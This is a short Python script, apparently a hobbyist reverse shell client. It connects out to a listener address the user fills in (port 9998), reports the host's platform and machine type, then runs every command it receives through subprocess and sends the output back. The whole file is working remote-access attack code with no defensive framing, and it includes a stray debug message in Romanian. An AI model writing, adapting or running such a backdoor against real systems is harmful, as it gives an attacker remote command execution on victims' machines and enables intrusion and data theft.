import platform # getting info about the system with this command
import socket # network stuff
import shlex 
import subprocess # spawn processes, connect to I/O pipes, obtain return codes
import sys # system stuff
import threading
import platform #to find system information about the target

TARGET_HOST = "INSERT YOUR IP HERE"
TARGET_PORT = 9998

def createSocketAndRun():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print("Connecting..",end='\n')
    client.connect((TARGET_HOST, TARGET_PORT))

    buffer = ''
    buffer += platform.platform()+ ' ' + platform.machine() + '\n'

    # first, send the informations about the system.
    client.send(buffer.encode())
    
    while True:
        try:
            outputBuffer = client.recv(4096)
            # receive the command and execute it

            print(outputBuffer.decode())
            # try to execute the process. If it doesn't work, then you can try to tell the listener that it's not allright
            try:
                commandList = outputBuffer.decode()
                commandList = commandList.split(sep=" ")
                print(f"CommandList = {commandList}")
                try:
                    buffer = subprocess.check_output(commandList, stderr=subprocess.STDOUT) # still working on output exception error 
                except subprocess.CalledProcessError as e:
                    buffer = e.output
                
                print(f'Am executat comanda {outputBuffer.decode()} si am dat de bufferul {buffer}')
                if(buffer != b''):
                    client.send(buffer)
                else:
                    client.send(b'This command doesn\'t return anything\n.')

            except Exception as ex:
                buffer = f'Error at running the command / process: {ex}'
                client.send(buffer.encode())
            
        except Exception as e:
            sys.exit()

createSocketAndRun()
        

    

